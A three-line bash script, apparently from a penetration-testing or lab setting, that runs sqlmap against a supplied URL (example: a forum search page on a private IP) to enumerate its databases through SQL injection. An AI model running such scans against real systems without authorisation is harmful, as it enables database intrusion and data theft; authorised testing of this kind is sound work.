#!/bin/bash
#Target in format "http://192.168.1.202/?p=1&forumaction=search"
export TARGET=$1
sqlmap -u $TARGET --dbs